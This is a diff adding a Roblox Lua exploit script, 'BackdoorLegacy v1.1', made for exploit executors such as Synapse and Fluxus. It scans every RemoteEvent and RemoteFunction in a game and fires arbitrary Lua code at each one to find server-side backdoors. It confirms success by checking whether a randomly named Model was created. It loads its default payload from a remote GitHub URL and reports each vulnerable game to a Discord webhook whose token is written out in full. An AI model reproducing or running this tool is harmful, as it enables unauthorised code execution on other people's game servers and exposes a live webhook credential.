@@ -1,0 +1,303 @@
+-- == Partie pour Discord Webhook ==
+local HttpService = game:GetService("HttpService")
+
+local webhookUrl = "https://discord.com/api/webhooks/1355719783735365762/9R_DzsqluTqr7wbbpl_3k1Ta4byL5kE7mqKQgH8IhE7uNiPDQgWCLtGC_bYAsUBVXEHl" -- Remplace ici
+
+local function sendToDiscord(gameId)
+    -- Get the game details
+    local gameTitle = game:GetService("MarketplaceService"):GetProductInfo(gameId).Name
+    local totalPlayers = 0
+    
+    -- Calculate total number of players in all servers
+    for _, server in pairs(game:GetService("Players"):GetPlayers()) do
+        totalPlayers = totalPlayers + 1
+    end
+
+    -- Prepare the embed data
+    local data = {
+        embeds = {
+            {
+                title = "BackdoorLegacy | Jeu vulnérable détecté!",
+                description = "GameId: " .. gameId .. "\nTitle: " .. gameTitle .. "\nTotal Players: " .. totalPlayers,
+                color = 0xFF0000,  -- Red color for alert
+                fields = {
+                    {
+                        name = "Game Information",
+                        value = "Game ID: " .. gameId .. "\nTitle: " .. gameTitle .. "\nTotal Players: " .. totalPlayers,
+                    },
+                },
+                footer = {
+                    text = "BackdoorLegacy v1.1 - Action triggered",
+                },
+            }
+        }
+    }
+
+    local payload = HttpService:JSONEncode(data)
+
+    -- Fonction pour envoyer la requête HTTP en fonction de la méthode disponible
+    local function sendReq()
+        if syn and syn.request then
+            -- Si syn.request est disponible (par exemple, sur Synapse)
+            local response = syn.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = payload
+            })
+            if response then
+                print("Webhook envoyé avec succès avec syn.request!")
+            else
+                warn("Erreur avec syn.request")
+            end
+        elseif fluxus and fluxus.request then
+            -- Si fluxus.request est disponible
+            local response = fluxus.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = payload
+            })
+            if response then
+                print("Webhook envoyé avec succès avec fluxus.request!")
+            else
+                warn("Erreur avec fluxus.request")
+            end
+        elseif http_request then
+            -- Si http_request est disponible (par exemple, sur un environnement Roblox standard modifié)
+            local response = http_request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = payload
+            })
+            if response then
+                print("Webhook envoyé avec succès avec http_request!")
+            else
+                warn("Erreur avec http_request")
+            end
+        elseif request then
+            -- Si request est disponible (ancien environnement Roblox modifié)
+            local response = request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = payload
+            })
+            if response then
+                print("Webhook envoyé avec succès avec request!")
+            else
+                warn("Erreur avec request")
+            end
+        else
+            -- Si aucune méthode de requête HTTP n'est trouvée
+            warn("Aucune méthode de requête HTTP valide trouvée !")
+        end
+    end
+
+    -- Appel de la fonction pour envoyer la requête
+    sendReq()
+end
+-- == Fin de la partie Webhook ==
+
+local function debug(msg)
+    if 0 == 1 then 
+        game:GetService('TestService'):Message('BackdoorLegacy // '..tostring(msg))
+    end 
+end
+
+-- Create GUI Objects
+
+local ScrnGui = Instance.new("ScreenGui")
+local MnPrt = Instance.new("Frame")
+local InPrt = Instance.new("Frame")
+local Cody = Instance.new("TextBox")
+local Execy = Instance.new("TextButton")
+local Acqur = Instance.new("TextButton")
+local Labely = Instance.new("TextLabel")
+
+-- Set Properties
+
+ScrnGui.Name = "BackdoorLegacy"
+ScrnGui.Parent = game:GetService('CoreGui')
+ScrnGui.ResetOnSpawn = false
+
+MnPrt.Active = true
+MnPrt.BackgroundColor3 = Color3.new(0,0,0)
+MnPrt.BorderColor3 = Color3.new(1,0,0)
+MnPrt.Name = "MainPart"
+MnPrt.Parent = ScrnGui
+MnPrt.Position = UDim2.new(.5,-180,.5,-120)
+MnPrt.Size = UDim2.new(0,360,0,240)
+MnPrt.Draggable = true
+
+InPrt.Active = true
+InPrt.BackgroundColor3 = Color3.new(0,0,0)
+InPrt.BorderColor3 = Color3.new(1,0,0)
+InPrt.Name = "Inside"
+InPrt.Parent = MnPrt
+InPrt.Position = UDim2.new(0,0,0,50)
+InPrt.Size = UDim2.new(0,360,0,190)
+InPrt.Draggable = false
+
+Cody.Active = true
+Cody.BackgroundColor3 = Color3.new(0,0,0)
+Cody.BorderColor3 = Color3.new(1,0,0)
+Cody.ClearTextOnFocus = false
+Cody.MultiLine = true
+Cody.Name = "Code"
+Cody.Parent = InPrt
+Cody.Position = UDim2.new(0,5,0,5)
+Cody.Size = UDim2.new(0,350,0,140)
+Cody.Font = Enum.Font.Legacy
+Cody.FontSize = Enum.FontSize.Size8
+Cody.Text = game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/checkerCode/main.lua')
+Cody.TextColor3 = Color3.new(1,0,0)
+Cody.TextWrapped = true
+Cody.TextXAlignment = Enum.TextXAlignment.Left
+Cody.TextYAlignment = Enum.TextYAlignment.Top
+
+Execy.Active = true
+Execy.BackgroundColor3 = Color3.new(0,0,0)
+Execy.BorderColor3 = Color3.new(1,0,0)
+Execy.Name = "Execute"
+Execy.Parent = InPrt
+Execy.Position = UDim2.new(0,5,0,150)
+Execy.Size = UDim2.new(0,170,0,35)
+Execy.Font = Enum.Font.Legacy
+Execy.FontSize = Enum.FontSize.Size14
+Execy.Text = 'Execute!'
+Execy.TextColor3 = Color3.new(1,0,0)
+
+Acqur.Active = true
+Acqur.BackgroundColor3 = Color3.new(0,0,0)
+Acqur.BorderColor3 = Color3.new(1,0,0)
+Acqur.Name = "Acquire"
+Acqur.Parent = InPrt
+Acqur.Position = UDim2.new(0,185,0,150)
+Acqur.Size = UDim2.new(0,170,0,35)
+Acqur.Font = Enum.Font.Legacy
+Acqur.FontSize = Enum.FontSize.Size14
+Acqur.Text = 'Acquire!'
+Acqur.TextColor3 = Color3.new(1,0,0)
+
+Labely.Active = true
+Labely.BackgroundColor3 = Color3.new(0,0,0)
+Labely.BorderColor3 = Color3.new(1,0,0)
+Labely.Name = "Title"
+Labely.Parent = MnPrt
+Labely.Position = UDim2.new(0,180,0,25)
+Labely.Size = UDim2.new(0,0,0,0)
+Labely.Font = Enum.Font.Legacy
+Labely.FontSize = Enum.FontSize.Size14
+Labely.Text = 'BackdoorLegacy v1.1'
+Labely.TextColor3 = Color3.new(1,0,0)
+
+-- Add functionalities!
+
+local AcquiredRemote = nil 
+local isAcquiring = false 
+
+Execy.MouseButton1Click:Connect(function()
+    local CodeStr = Cody.Text
+    local InvokeFunc = Instance.new("BindableEvent")
+    InvokeFunc.Event:Connect(function(rfunc, codestr2)
+        rfunc:InvokeServer(codestr2)
+    end)
+
+    local function DeepFire(inst)
+        if not isAcquiring then 
+            if AcquiredRemote == nil then 
+                for _, childy in inst:GetChildren() do
+                    if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
+                        if childy:IsA("RemoteEvent") then
+                            print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
+                            childy:FireServer(CodeStr)
+                        elseif childy:IsA("RemoteFunction") then
+                            print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
+                            InvokeFunc:Fire(childy, CodeStr)
+                        end
+                    end
+                    DeepFire(childy)
+                end 
+            else 
+                if AcquiredRemote:IsA("RemoteEvent") then 
+                    AcquiredRemote:FireServer(CodeStr) 
+                elseif AcquiredRemote:IsA("RemoteFunction") then 
+                    task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
+                end
+            end 
+        end
+    end
+    warn("Backdoor Legacy // Running all remotes with code:\n"..CodeStr)
+    DeepFire(game)
+end)
+
+Acqur.MouseButton1Click:Connect(function() 
+    local RemoteList = {} 
+    local CurrentRemote = nil 
+    local isFound = false 
+    if not isAcquiring then 
+        isAcquiring = true 
+        warn('BackdoorLegacy // Scanning Started!') 
+        Cody.Text = '-- Please wait, while we are scanning the remotes.'
+        for i,v in pairs(game:GetDescendants()) do 
+            if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
+                    debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
+                    table.insert(RemoteList,v) 
+                end 
+            end
+        end 
+        for a,b in pairs(RemoteList) do
+            if AcquiredRemote == nil then 
+                print("BackdoorLegacy // Checking "..b.ClassName..' "'..b.Name..'".') 
+                local NeededNameOfModel = ""
+                for i = 1, 60 do
+                    NeededNameOfModel = NeededNameOfModel..string.char(math.random(65,90))
+                end
+                local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel..'"'
+                CurrentRemote = b 
+                if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+                    if b:IsA('RemoteEvent') then 
+                        debug('Fired')
+                        b:FireServer(NeededCode) 
+                    elseif b:IsA('RemoteFunction') then 
+                        debug('Invoked')
+                        task.spawn(function() b:InvokeServer(NeededCode) end) 
+                    end 
+                end
+                debug('Awaiting')
+                wait(2.5) 
+                if workspace:FindFirstChild(NeededNameOfModel) then 
+                    debug('Detected')
+                    if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
+                        debug('Success')
+                        AcquiredRemote = b
+                    end 
+                end 
+            end 
+        end     
+        if AcquiredRemote ~= nil then 
+            isFound = true 
+            Cody.Text = '-- Remote acquired! :D' 
+            warn('BackdoorLegacy // Remote acquired! :D')
+            sendToDiscord(game.GameId) -- ICI ON ENVOIE SUR DISCORD
+        else 
+            isFound = false 
+            Cody.Text = '-- Not found. :(' 
+            warn('BackdoorLegacy // Not found. :(')
+        end 
+        isAcquiring = false 
+    end 
+end)
+
+-- End of script
